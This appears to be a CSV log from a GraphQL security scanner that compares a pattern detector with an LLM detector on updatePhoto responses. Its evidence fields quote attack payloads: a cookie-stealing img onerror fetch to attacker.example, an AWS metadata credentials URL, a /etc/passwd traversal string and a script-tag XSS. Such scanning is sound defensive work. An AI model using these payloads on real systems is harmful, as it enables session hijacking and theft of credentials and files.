timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-03T07:23:50.111692,updatePhoto_response_2,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]",[]
2025-10-03T07:24:11.155152,updatePhoto_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains an unescaped script tag in the title field. Returning \""<script>alert('xss')</script>\"" indicates that user-supplied or stored HTML/JS is being returned without encoding. If a client renders this value into the DOM as HTML (innerHTML, template rendering without escaping, etc.) it will execute, resulting in reflected or stored XSS. This is a high-risk issue because it enables arbitrary JavaScript execution in victims' browsers. To confirm exploitation, verify how the client inserts this field into the page. Mitigations: properly encode/escape output when inserting into HTML, sanitize or strip dangerous HTML on input or before storage, use safe templating APIs that auto-escape, and enforce a strict Content-Security-Policy (CSP)."", ""evidence"": ""data.updatePhoto.title = \""<script>alert('xss')</script>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""data.updatePhoto.title = \""<script>alert('xss')</script>\"""", ""explanation"": ""The GraphQL response contains an unescaped script tag in the title field. Returning \""<script>alert('xss')</script>\"" indicates that user-supplied or stored HTML/JS is being returned without encoding. If a client renders this value into the DOM as HTML (innerHTML, template rendering without escaping, etc.) it will execute, resulting in reflected or stored XSS. This is a high-risk issue because it enables arbitrary JavaScript execution in victims' browsers. To confirm exploitation, verify how the client inserts this field into the page. Mitigations: properly encode/escape output when inserting into HTML, sanitize or strip dangerous HTML on input or before storage, use safe templating APIs that auto-escape, and enforce a strict Content-Security-Policy (CSP).""}}]"
2025-10-03T07:24:25.332836,updatePhoto_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response shows the updatePhoto mutation returning a URL that points to 169.254.169.254, the AWS instance metadata service (IMDS) endpoint. This is a strong indicator the server accepted and/or dereferenced a user-supplied URL that targets an internal-only address. If the application performs server-side requests to arbitrary URLs provided by clients (e.g., fetching images for updatePhoto), an attacker can induce requests to internal resources (IMDS, internal services), potentially exposing sensitive data such as IAM credentials or other internal metadata. Because access to the IMDS can lead to compromise of cloud credentials and broader account takeover, this is a critical SSRF risk. Recommended mitigations: enforce a strict allowlist of domains/IPs for remote fetches, block requests to link-local and metadata ranges (169.254.169.254/32) at the application and network egress level, validate and normalize user-supplied URLs, and perform server-side fetches from isolated network contexts with minimal privileges."", ""evidence"": ""Response contains URL 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' returned by the updatePhoto mutation."", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.8, ""evidence"": ""Response contains URL 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' returned by the updatePhoto mutation."", ""explanation"": ""The GraphQL response shows the updatePhoto mutation returning a URL that points to 169.254.169.254, the AWS instance metadata service (IMDS) endpoint. This is a strong indicator the server accepted and/or dereferenced a user-supplied URL that targets an internal-only address. If the application performs server-side requests to arbitrary URLs provided by clients (e.g., fetching images for updatePhoto), an attacker can induce requests to internal resources (IMDS, internal services), potentially exposing sensitive data such as IAM credentials or other internal metadata. Because access to the IMDS can lead to compromise of cloud credentials and broader account takeover, this is a critical SSRF risk. Recommended mitigations: enforce a strict allowlist of domains/IPs for remote fetches, block requests to link-local and metadata ranges (169.254.169.254/32) at the application and network egress level, validate and normalize user-supplied URLs, and perform server-side fetches from isolated network contexts with minimal privileges.""}}]"
2025-10-03T07:24:43.092660,updatePhoto_response_5,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T07:25:00.499351,updatePhoto_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response for updatePhoto returns a thumbnailUrl value containing a directory traversal payload ('../../../../../etc/passwd'). This is strong evidence of a path traversal/path injection issue: the application is exposing or using file system paths that resolve to sensitive local files (here /etc/passwd). If an attacker can control or influence this field, they may be able to cause the server to read arbitrary files or expose sensitive filesystem contents. Impact includes disclosure of system files and potentially sensitive data. Recommended mitigations: validate and canonicalize file paths on the server, disallow path traversal tokens (\""..\""), restrict file access to a safe, whitelisted directory, and never construct file paths from untrusted input."", ""evidence"": ""\""thumbnailUrl\"": \""../../../../../etc/passwd\"""", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""HIGH"", ""confidence"": 0.85, ""evidence"": ""\""thumbnailUrl\"": \""../../../../../etc/passwd\"""", ""explanation"": ""The GraphQL response for updatePhoto returns a thumbnailUrl value containing a directory traversal payload ('../../../../../etc/passwd'). This is strong evidence of a path traversal/path injection issue: the application is exposing or using file system paths that resolve to sensitive local files (here /etc/passwd). If an attacker can control or influence this field, they may be able to cause the server to read arbitrary files or expose sensitive filesystem contents. Impact includes disclosure of system files and potentially sensitive data. Recommended mitigations: validate and canonicalize file paths on the server, disallow path traversal tokens (\""..\""), restrict file access to a safe, whitelisted directory, and never construct file paths from untrusted input.""}}]"
2025-10-03T07:25:13.770924,updatePhoto_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains an unescaped HTML img tag with an onerror JavaScript handler in the 'title' field. This is indicative of HTML injection (and effectively an XSS payload) \u2014 if a client (web page or other HTML-rendering consumer) inserts this 'title' value into the DOM without proper escaping or sanitization, the onerror handler will execute and perform a fetch to an attacker-controlled domain including document.cookie. Impact includes session token theft, account takeover, data exfiltration, and further client-side compromise. Recommended mitigations: properly escape or sanitize user-controlled values before including them in HTML, enforce a strong Content Security Policy (CSP), validate/encode output on the server, and apply input validation to disallow embedded markup where not expected."", ""evidence"": ""data.updatePhoto.title = \""<img src=x onerror='fetch(\\\""https://attacker.example/steal?c=\\\""+document.cookie)'>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""data.updatePhoto.title = \""<img src=x onerror='fetch(\\\""https://attacker.example/steal?c=\\\""+document.cookie)'>\"""", ""explanation"": ""The GraphQL response contains an unescaped HTML img tag with an onerror JavaScript handler in the 'title' field. This is indicative of HTML injection (and effectively an XSS payload) \u2014 if a client (web page or other HTML-rendering consumer) inserts this 'title' value into the DOM without proper escaping or sanitization, the onerror handler will execute and perform a fetch to an attacker-controlled domain including document.cookie. Impact includes session token theft, account takeover, data exfiltration, and further client-side compromise. Recommended mitigations: properly escape or sanitize user-controlled values before including them in HTML, enforce a strong Content Security Policy (CSP), validate/encode output on the server, and apply input validation to disallow embedded markup where not expected.""}}]"
2025-10-03T07:25:23.703041,updatePhoto_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T07:25:35.146300,updatePhoto_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T07:25:53.624782,updatePhoto_response_10,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-03T07:26:06.035871,updatePhoto_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL error responses include automatic field-name suggestions (e.g., suggesting \""title\"" and \""url\"" when misspellings \""titel\"" and \""urll\"" were queried). This leaks schema information about available fields on the Photo type and makes it easier for an attacker to discover valid field names and map the API. While this is an information disclosure rather than direct code execution, it aids reconnaissance and can facilitate further attacks (enumeration, overfetching of sensitive fields, crafting targeted queries). Recommended mitigation: suppress or redact automatic suggestion text in production validation errors, return generic validation messages, and gate schema discovery via authentication/authorization or introspection controls."", ""evidence"": ""Response errors: \""Cannot query field \\\""titel\\\"" on type \\\""Photo\\\"". Did you mean \\\""title\\\""?\"" and \""Cannot query field \\\""urll\\\"" on type \\\""Photo\\\"". Did you mean \\\""url\\\""?\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""Response errors: \""Cannot query field \\\""titel\\\"" on type \\\""Photo\\\"". Did you mean \\\""title\\\""?\"" and \""Cannot query field \\\""urll\\\"" on type \\\""Photo\\\"". Did you mean \\\""url\\\""?\"""", ""explanation"": ""The GraphQL error responses include automatic field-name suggestions (e.g., suggesting \""title\"" and \""url\"" when misspellings \""titel\"" and \""urll\"" were queried). This leaks schema information about available fields on the Photo type and makes it easier for an attacker to discover valid field names and map the API. While this is an information disclosure rather than direct code execution, it aids reconnaissance and can facilitate further attacks (enumeration, overfetching of sensitive fields, crafting targeted queries). Recommended mitigation: suppress or redact automatic suggestion text in production validation errors, return generic validation messages, and gate schema discovery via authentication/authorization or introspection controls.""}}]"
